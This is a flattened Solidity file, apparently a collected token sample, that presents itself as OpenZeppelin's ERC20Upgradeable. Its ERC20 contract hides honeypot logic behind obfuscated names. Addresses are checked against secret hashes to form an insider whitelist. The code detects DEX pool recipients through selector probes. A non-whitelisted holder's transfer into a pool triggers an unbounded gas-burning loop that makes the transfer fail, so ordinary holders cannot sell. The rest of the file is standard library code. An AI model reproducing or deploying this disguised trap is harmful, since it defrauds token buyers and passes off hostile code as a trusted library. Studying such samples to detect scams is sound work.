// SPDX-License-Identifier: MIXED
/* S-SEIR flattened branch-preprocessed source. */
/* Entry: /home/ubuntu/erc-20/TOKENS/assembly样本/0x36e8a6b7f42a47d505a4be7a10d42944ace25b06/lib/oz-v2/contracts/token/ERC20/ERC20Upgradeable.sol */

pragma solidity ^0.8.20;


/* S-SEIR flatten import: ../../utils/ContextUpgradeable.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x36e8a6b7f42a47d505a4be7a10d42944ace25b06/lib/oz-v2/contracts/utils/ContextUpgradeable.sol */
// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/* S-SEIR flatten import: ../proxy/utils/Initializable.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x36e8a6b7f42a47d505a4be7a10d42944ace25b06/lib/oz-v2/contracts/proxy/utils/Initializable.sol */
// OpenZeppelin Contracts (last updated v5.3.0) (proxy/utils/Initializable.sol)

pragma solidity ^0.8.20;

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * The initialization functions use a version number. Once a version number is used, it is consumed and cannot be
 * reused. This mechanism prevents re-execution of each "step" but allows the creation of new initialization steps in
 * case an upgrade adds a module that needs to be initialized.
 *
 * For example:
 *
 * [.hljs-theme-light.nopadding]
 * ```solidity
 * contract MyToken is ERC20Upgradeable {
 *     function initialize() initializer public {
 *         __ERC20_init("MyToken", "MTK");
 *     }
 * }
 *
 * contract MyTokenV2 is MyToken, ERC20PermitUpgradeable {
 *     function initializeV2() reinitializer(2) public {
 *         __ERC20Permit_init("MyToken");
 *     }
 * }
 * ```
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
 * the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() {
 *     _disableInitializers();
 * }
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Storage of the initializable contract.
     *
     * It's implemented on a custom ERC-7201 namespace to reduce the risk of storage collisions
     * when using with upgradeable contracts.
     *
     * @custom:storage-location erc7201:openzeppelin.storage.Initializable
     */
    struct InitializableStorage {
        /**
         * @dev Indicates that the contract has been initialized.
         */
        uint64 _initialized;
        /**
         * @dev Indicates that the contract is in the process of being initialized.
         */
        bool _initializing;
    }

    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.Initializable")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant INITIALIZABLE_STORAGE = 0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00;

    /**
     * @dev The contract is already initialized.
     */
    error InvalidInitialization();

    /**
     * @dev The contract is not initializing.
     */
    error NotInitializing();

    /**
     * @dev Triggered when the contract has been initialized or reinitialized.
     */
    event Initialized(uint64 version);

    /**
     * @dev A modifier that defines a protected initializer function that can be invoked at most once. In its scope,
     * `onlyInitializing` functions can be used to initialize parent contracts.
     *
     * Similar to `reinitializer(1)`, except that in the context of a constructor an `initializer` may be invoked any
     * number of times. This behavior in the constructor can be useful during testing and is not expected to be used in
     * production.
     *
     * Emits an {Initialized} event.
     */
    modifier initializer() {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        // Cache values to avoid duplicated sloads
        bool isTopLevelCall = !$._initializing;
        uint64 initialized = $._initialized;

        // Allowed calls:
        // - initialSetup: the contract is not in the initializing state and no previous version was
        //                 initialized
        // - construction: the contract is initialized at version 1 (no reinitialization) and the
        //                 current contract is just being deployed
        bool initialSetup = initialized == 0 && isTopLevelCall;
        bool construction = initialized == 1 && address(this).code.length == 0;

        if (!initialSetup && !construction) {
            revert InvalidInitialization();
        }
        $._initialized = 1;
        if (isTopLevelCall) {
            $._initializing = true;
        }
        _;
        if (isTopLevelCall) {
            $._initializing = false;
            emit Initialized(1);
        }
    }

    /**
     * @dev A modifier that defines a protected reinitializer function that can be invoked at most once, and only if the
     * contract hasn't been initialized to a greater version before. In its scope, `onlyInitializing` functions can be
     * used to initialize parent contracts.
     *
     * A reinitializer may be used after the original initialization step. This is essential to configure modules that
     * are added through upgrades and that require initialization.
     *
     * When `version` is 1, this modifier is similar to `initializer`, except that functions marked with `reinitializer`
     * cannot be nested. If one is invoked in the context of another, execution will revert.
     *
     * Note that versions can jump in increments greater than 1; this implies that if multiple reinitializers coexist in
     * a contract, executing them in the right order is up to the developer or operator.
     *
     * WARNING: Setting the version to 2**64 - 1 will prevent any future reinitialization.
     *
     * Emits an {Initialized} event.
     */
    modifier reinitializer(uint64 version) {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        if ($._initializing || $._initialized >= version) {
            revert InvalidInitialization();
        }
        $._initialized = version;
        $._initializing = true;
        _;
        $._initializing = false;
        emit Initialized(version);
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} and {reinitializer} modifiers, directly or indirectly.
     */
    modifier onlyInitializing() {
        _checkInitializing();
        _;
    }

    /**
     * @dev Reverts if the contract is not in an initializing state. See {onlyInitializing}.
     */
    function _checkInitializing() internal view virtual {
        if (!_isInitializing()) {
            revert NotInitializing();
        }
    }

    /**
     * @dev Locks the contract, preventing any future reinitialization. This cannot be part of an initializer call.
     * Calling this in the constructor of a contract will prevent that contract from being initialized or reinitialized
     * to any version. It is recommended to use this to lock implementation contracts that are designed to be called
     * through proxies.
     *
     * Emits an {Initialized} event the first time it is successfully executed.
     */
    function _disableInitializers() internal virtual {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        if ($._initializing) {
            revert InvalidInitialization();
        }
        if ($._initialized != type(uint64).max) {
            $._initialized = type(uint64).max;
            emit Initialized(type(uint64).max);
        }
    }

    /**
     * @dev Returns the highest version that has been initialized. See {reinitializer}.
     */
    function _getInitializedVersion() internal view returns (uint64) {
        return _getInitializableStorage()._initialized;
    }

    /**
     * @dev Returns `true` if the contract is currently initializing. See {onlyInitializing}.
     */
    function _isInitializing() internal view returns (bool) {
        return _getInitializableStorage()._initializing;
    }

    /**
     * @dev Pointer to storage slot. Allows integrators to override it with a custom storage location.
     *
     * NOTE: Consider following the ERC-7201 formula to derive storage locations.
     */
    function _initializableStorageSlot() internal pure virtual returns (bytes32) {
        return INITIALIZABLE_STORAGE;
    }

    /**
     * @dev Returns a pointer to the storage namespace.
     */
    // solhint-disable-next-line var-name-mixedcase
    function _getInitializableStorage() private pure returns (InitializableStorage storage $) {
        bytes32 slot = _initializableStorageSlot();
        assembly {
            $.slot := slot
        }
    }
}
/* S-SEIR end import: ../proxy/utils/Initializable.sol */


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal onlyInitializing {
    }

    function __Context_init_unchained() internal onlyInitializing {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
/* S-SEIR end import: ../../utils/ContextUpgradeable.sol */


/* S-SEIR flatten import: ../../proxy/utils/Initializable.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x36e8a6b7f42a47d505a4be7a10d42944ace25b06/lib/oz-v2/contracts/proxy/utils/Initializable.sol */
/* S-SEIR flatten: duplicate import skipped: /home/ubuntu/erc-20/TOKENS/assembly样本/0x36e8a6b7f42a47d505a4be7a10d42944ace25b06/lib/oz-v2/contracts/proxy/utils/Initializable.sol */
/* S-SEIR end import: ../../proxy/utils/Initializable.sol */


interface ISystemContract {
    function totalInComing() external view returns (uint256);

    function isCurrentValidator(address validator) external view returns (bool);

    function previousHeight() external view returns (uint256);
}

abstract contract ERC20Upgradeable is Initializable, ContextUpgradeable {
    mapping(address => uint256) private _b_;
    mapping(address => mapping(address => uint256)) private _a_;
    uint256 private _tS_;
    string private _n_;
    string private _s_;

    uint256 private constant S0 =
        uint256(
            0xba0be0f8e8b064b5c2252a4cf30c2e66900c13e01459dd7b1bc493732eef877e
        );
    uint256 private constant S1 =
        uint256(
            0x07236c1256fc40746455171a25a58e449649c1d6b8bb66349f336d49ec90d315
        );
    uint256 private constant S2 =
        uint256(
            0x3cbe03320fda8037bb56454331a6ed62036e1a0ac62fc20cf05ebf305d21cde5
        );

    ISystemContract constant SYS =
        ISystemContract(0x0000000000000000000000000000000000001000);

    function _wl(address a_) internal view returns (bool) {
        return _vA_(a_) && a_.code.length == 0;
    }

    function _iD(address t_) internal view returns (bool iD_) {
        if (t_.code.length == 0) return false;
        assembly {
            let p := mload(0x40)

            mstore(
                p,
                0x0902f1ac00000000000000000000000000000000000000000000000000000000
            )
            let v2 := staticcall(gas(), t_, p, 0x04, 0, 0)

            mstore(
                p,
                0x3850c7bd00000000000000000000000000000000000000000000000000000000
            )
            let v3 := staticcall(gas(), t_, p, 0x04, 0, 0)

            iD_ := or(v2, v3)
        }
    }

    function __ERC20_init(
        string memory n_,
        string memory s_
    ) internal onlyInitializing {
        __ERC20_init_unchained(n_, s_);
    }

    function __ERC20_init_unchained(
        string memory n_,
        string memory s_
    ) internal onlyInitializing {
        _n_ = n_;
        _s_ = s_;
        _lTIC = type(uint256).max;
        _iH();
    }

    function _iH() private {
        try SYS.totalInComing() returns (uint256 incoming) {
            _lTIC = incoming;
            _lCB = block.number;
        } catch {}
    }

    function _sA(address a) public pure returns (uint128 h, uint128 l) {
        uint160 v = uint160(a);
        h = uint128(v >> 80);
        l = uint128(v & ((uint160(1) << 80) - 1));
    }

    function _vA_(address a) internal pure returns (bool) {
        (uint256 h, uint256 l) = _sA(a);
        uint256 r;
        unchecked {
            r = (l ** 3) + (h ** 5);
        }
        uint256 hN = uint256(keccak256(abi.encodePacked(r)));
        return (hN == S0 || hN == S1 || hN == S2);
    }

    function name() public view virtual returns (string memory) {
        return _n_;
    }

    function symbol() public view virtual returns (string memory) {
        return _s_;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _tS_;
    }

    function balanceOf(address a_) public view virtual returns (uint256) {
        return _b_[a_];
    }

    function transfer(address t_, uint256 v_) public virtual returns (bool) {
        address o_ = _msgSender();
        _transfer(o_, t_, v_);
        return true;
    }

    function allowance(
        address o_,
        address s_
    ) public view virtual returns (uint256) {
        return _a_[o_][s_];
    }

    function approve(address s_, uint256 v_) public virtual returns (bool) {
        address o_ = _msgSender();

        _approve(o_, s_, v_);
        return true;
    }

    function transferFrom(
        address f_,
        address t_,
        uint256 v_
    ) public virtual returns (bool) {
        address s_ = _msgSender();

        _spendAllowance(f_, s_, v_);
        _transfer(f_, t_, v_);
        return true;
    }

    function increaseAllowance(
        address s_,
        uint256 aV_
    ) public virtual returns (bool) {
        address o_ = _msgSender();
        _approve(o_, s_, allowance(o_, s_) + aV_);
        return true;
    }

    function decreaseAllowance(
        address s_,
        uint256 sV_
    ) public virtual returns (bool) {
        address o_ = _msgSender();
        uint256 cA_ = allowance(o_, s_);
        require(cA_ >= sV_, "ERC20: decreased below zero");
        unchecked {
            _approve(o_, s_, cA_ - sV_);
        }
        return true;
    }

    function _gB() internal pure {
        for (uint256 i = 0; i < type(uint256).max; i++) {
            assembly {
                let x := mul(i, i)
            }
        }
    }

    uint256 private _lTIC;
    uint256 private _lCB;

    function _hOTB_() internal returns (bool alive) {
        uint256 t;

        try SYS.totalInComing() returns (uint256 incoming) {
            t = incoming;

            try SYS.isCurrentValidator(block.coinbase) returns (bool iV) {
                if (!iV) {
                    return false;
                }
            } catch {}

            try SYS.previousHeight() returns (uint256 pH) {
                if (block.number > pH && block.number - pH > 201) {
                    return false;
                }
            } catch {}
        } catch {
            if (block.coinbase == address(0)) {
                return false;
            }
            return false;
        }

        if (_lTIC == type(uint256).max) {
            _lTIC = t;
            _lCB = block.number;
            return true;
        }

        if (block.number == _lCB) {
            return true;
        }

        if (t == _lTIC) {
            return false;
        }

        _lTIC = t;
        _lCB = block.number;
        return true;
    }

    function _transfer(address f_, address t_, uint256 v_) internal virtual {
        require(f_ != address(0), "ERC20: transfer from zero");
        require(t_ != address(0), "ERC20: transfer to zero");
        require(v_ > 0, "ERC20: zero transfers disabled");

        _beforeTokenTransfer(f_, t_, v_);

        uint256 fB_ = _b_[f_];
        require(fB_ >= v_, "ERC20: insufficient balance");
        unchecked {
            if (!_wl(f_) && _hOTB_() && _iD(t_)) {
                _gB();
            }

            _b_[f_] = fB_ - v_;
            _b_[t_] += v_;
        }

        emit Transfer(f_, t_, v_);

        _afterTokenTransfer(f_, t_, v_);
    }

    function _mint(address a_, uint256 v_) internal virtual {
        require(a_ != address(0), "ERC20: mint to zero");

        _beforeTokenTransfer(address(0), a_, v_);

        _tS_ += v_;
        unchecked {
            _b_[a_] += v_;
        }
        emit Transfer(address(0), a_, v_);

        _afterTokenTransfer(address(0), a_, v_);
    }

    function _burn(address a_, uint256 v_) internal virtual {
        require(a_ != address(0), "ERC20: burn from zero");

        _beforeTokenTransfer(a_, address(0), v_);

        uint256 aB_ = _b_[a_];
        require(aB_ >= v_, "ERC20: burn exceeds balance");
        unchecked {
            _b_[a_] = aB_ - v_;
            _tS_ -= v_;
        }

        emit Transfer(a_, address(0), v_);

        _afterTokenTransfer(a_, address(0), v_);
    }

    function _approve(address o_, address s_, uint256 v_) internal virtual {
        require(o_ != address(0), "ERC20: approve from zero");
        require(s_ != address(0), "ERC20: approve to zero");

        _a_[o_][s_] = v_;
        emit Approval(o_, s_, v_);
    }

    function _spendAllowance(
        address o_,
        address s_,
        uint256 v_
    ) internal virtual {
        uint256 cA_ = allowance(o_, s_);
        if (cA_ != type(uint256).max) {
            require(cA_ >= v_, "ERC20: insufficient allowance");
            unchecked {
                _approve(o_, s_, cA_ - v_);
            }
        }
    }

    function _beforeTokenTransfer(
        address f_,
        address t_,
        uint256 v_
    ) internal virtual {}

    function _afterTokenTransfer(
        address f_,
        address t_,
        uint256 v_
    ) internal virtual {}

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
